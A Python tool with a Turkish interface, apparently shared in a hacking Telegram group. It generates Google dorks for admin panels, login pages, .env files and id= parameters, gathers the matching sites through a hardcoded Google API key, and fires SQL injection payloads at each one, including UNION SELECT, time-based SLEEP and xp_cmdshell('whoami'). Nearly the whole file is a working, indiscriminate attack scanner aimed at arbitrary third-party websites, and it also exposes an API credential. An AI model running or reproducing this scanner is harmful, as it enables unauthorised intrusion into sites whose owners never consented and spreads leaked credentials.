# developer: @spyizxa Made for Sware Turkey

from rich.console import Console
import requests
from time import sleep
import random

# api key ve cse id girmelisiniz
API_KEY = "AIzaSyBaefB4CboJsj94g39wV8bamyTSNoQOqeA"
CSE_ID = "d0efba26422f149b7"

console = Console()

# SQLi payloads
payloads = [
    "'", "\"", "' OR 1=1--", "' AND 1=2--",
    "' UNION SELECT null--", "' OR SLEEP(5)--",
    "' UNION SELECT 1,2,3--", "' AND 1=1#",
    "' OR 'a'='a' --", "'; EXEC xp_cmdshell('whoami') --",
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "' UNION SELECT NULL, NULL, NULL --"
]

def google_search(query):
    try:
        url = f"https://www.googleapis.com/customsearch/v1?q={query}&key={API_KEY}&cx={CSE_ID}"
        response = requests.get(url)
        if response.status_code == 200:
            results = response.json()
            return [item['link'] for item in results.get('items', [])]
        else:
            console.print(f"[bold red]Arama hatası:[/bold red] {response.status_code}, Hata Mesajı: {response.text}")
            return []
    except Exception as e:
        console.print(f"[bold red]Google arama hatası:[/bold red] {e}")
        return []

def sql_injection(url):
    try:
        for payload in payloads:
            test_url = f"{url}{payload}"
            response = requests.get(test_url, headers=get_random_user_agent(), timeout=5)

            # Error-based SQLi test
            if response.status_code == 500 or "sql" in response.text.lower():
                return f"[bold red]{test_url} -> Error-based SQL Injection tespit edildi[/bold red]"

            # Time-based SQLi test
            if response.elapsed.total_seconds() > 3:
                return f"[bold red]{test_url} -> Zaman temelli SQL Injection[/bold red]"

        return False
    except requests.exceptions.RequestException as e:
        return f"[bold red]Hata:[/bold red] {e}"

def get_random_user_agent():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36'
    ]
    return {'User-Agent': random.choice(user_agents)}

# dorks
def generate_dorks(keyword):
    templates = [
        f'inurl:"admin.php" "{keyword}"',
        f'inurl:"admin/login.php" "{keyword}"',
        f'inurl:"/admin/" "{keyword}"',
        f'intitle:"Admin Panel" "{keyword}"',
        f'site:{keyword}.com inurl:"/login"',
        f'site:{keyword}.com inurl:"/user/login"',
        f'inurl:"login.aspx" "{keyword}"',
        f'inurl:"signin.php" "{keyword}"',
        f'inurl:"product.php?id=" "{keyword}"',
        f'inurl:"view.php?id=" "{keyword}"',
        f'inurl:"shop/item.php?item=" "{keyword}"',
        f'inurl:"index.php?page=" "{keyword}"',
        f'inurl:"page.php?file=" "{keyword}"',
        f'inurl:"load.php?path=" "{keyword}"',
        f'inurl:"include.php?file=" "{keyword}"',
        f'intitle:"index of" "{keyword}"',
        f'inurl:"/backup/" "{keyword}"',
        f'inurl:"/config/" "{keyword}"',
        f'inurl:"/.env" "{keyword}"',
        f'inurl:"wp-login.php" "{keyword}"',
        f'inurl:"/wp-admin/" "{keyword}"',
        f'inurl:"/joomla/administrator/" "{keyword}"',
        f'inurl:"/drupal/login/" "{keyword}"',
        f'inurl:"/uploads/" "{keyword}"',
        f'inurl:"/files/" "{keyword}"',
        f'inurl:"/docs/" "{keyword}"',
        f'inurl:"index.php?id=" "{keyword}"',
        f'inurl:"view.php?id=" "{keyword}"',
        f'inurl:"article.php?id=" "{keyword}"',
        f'inurl:"blog.php?id=" "{keyword}"'
    ]
    return templates

def continuous_scan(keywords):
    console.print(f"[bold green]Başlatılıyor... Anahtar kelimeler:[/bold green] {', '.join(keywords)}")
    
    while True: 
        for keyword in keywords:
            console.print(f"[bold cyan]Dork taranıyor:[/bold cyan] {keyword}")
            dorks = generate_dorks(keyword)
            
            for dork in dorks:
                console.print(f"[bold cyan]Dork taranıyor:[/bold cyan] {dork}")
                urls = google_search(dork)
                if not urls:
                    console.print("[bold yellow]Arama sonuçları bulunamadı.[/bold yellow]")
                    continue

                for url in urls:
                    console.print(f"[bold blue]Test ediliyor:[/bold blue] {url}")
                    result = sql_injection(url)
                    if result:
                        console.print(result)
                    else:
                        console.print(f"[yellow]{url} Güvenli görünüyor.[/yellow]")
        sleep(5)  # Taramalar arasında kısa bir bekleme

def manual_scan():
    while True:
        dork = input("\033[1;32mManuel Mod: Lütfen dork girin veya çıkmak için 'exit' yazın:\033[0m ").strip()
        if dork.lower() == "exit":
            break
        print(f"\033[1;33mDork taranıyor: {dork}\033[0m")
        urls = google_search(dork)
        if not urls:
            print("\033[1;31mArama sonuçları bulunamadı.\033[0m")
            continue

        for url in urls:
            print(f"\033[1;34mTest ediliyor: {url}\033[0m")
            result = sql_injection(url)
            if result:
                print(f"\033[1;31m{result}\033[0m")
            else:
                print(f"\033[1;32m{url} Güvenli görünüyor.\033[0m")

def main():
    print("""
\033[1;36m  ██████   █████   ██▓     ██▓▒██   ██▒▒███████▒ ▄▄▄      
▒██    ▒ ▒██▓  ██▒▓██▒    ▓██▒▒▒ █ █ ▒░▒ ▒ ▒ ▄▀░▒████▄    
░ ▓██▄   ▒██▒  ██░▒██░    ▒██▒░░  █   ░░ ▒ ▄▀▒░ ▒██  ▀█▄  
  ▒   ██▒░██  █▀ ░▒██░    ░██░ ░ █ █ ▒   ▄▀▒   ░░██▄▄▄▄██ 
▒██████▒▒░▒███▒█▄ ░██████▒░██░▒██▒ ▒██▒▒███████▒ ▓█   ▓██▒
▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░░▓  ▒▒ ░ ░▓ ░░▒▒ ▓░▒░▒ ▒▒   ▓▒█░
░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░ ▒ ░░░   ░▒ ░░░▒ ▒ ░ ▒  ▒   ▒▒ ░
░  ░  ░     ░   ░   ░ ░    ▒ ░ ░    ░  ░ ░ ░ ░ ░  ░   ▒   
      ░      ░        ░  ░ ░   ░    ░    ░ ░          ░  ░
                                       ░                  
                                       
developer: @spyizxa Made for t.me/swareturkey
welcome to sware!
\033[0m""")
    mode = input("\033[1;33mMod seçiniz:\n1 - Otomatik Mod (anahtar kelime ile)\n2 - Manuel Mod (DORK girerek)\nseçim yapınız (1/2): \033[0m").strip()

    if mode == "1":
        keywords = input("\n\033[1;36mAnahtar kelimeler giriniz (virgülle ayırarak birden fazla anahtar kelime girebilirsiniz): \033[0m").strip()
        if not keywords:
            print("\033[1;31mGeçerli bir anahtar kelime girin.\033[0m")
            exit()

        keywords = [k.strip() for k in keywords.split(",")]
        print(f"\033[1;32mOtomatik Mod Başlatılıyor... Anahtar kelime: {', '.join(keywords)}\033[0m")
        
        for keyword in keywords:
            dorks = generate_dorks(keyword)
            for dork in dorks:
                print(f"\033[1;33mDork taranıyor: {dork}\033[0m")
                urls = google_search(dork)
                if not urls:
                    print("\033[1;31mArama sonuçları bulunamadı.\033[0m")
                    continue

                for url in urls:
                    print(f"\033[1;34mTest ediliyor: {url}\033[0m")
                    result = sql_injection(url) 
                    if result:
                        print(f"\033[1;31m{result}\033[0m")
                    else:
                        print(f"\033[1;32m{url} Güvenli görünüyor.\033[0m")
        print("\033[1;32mTarama tamamlandı!\033[0m")

    elif mode == "2":
        manual_scan()  # Manuel mod 

    else:
        print("\033[1;31mGeçersiz mod seçimi! Lütfen 1 veya 2 girin.\033[0m")
        
if __name__ == "__main__":
    main()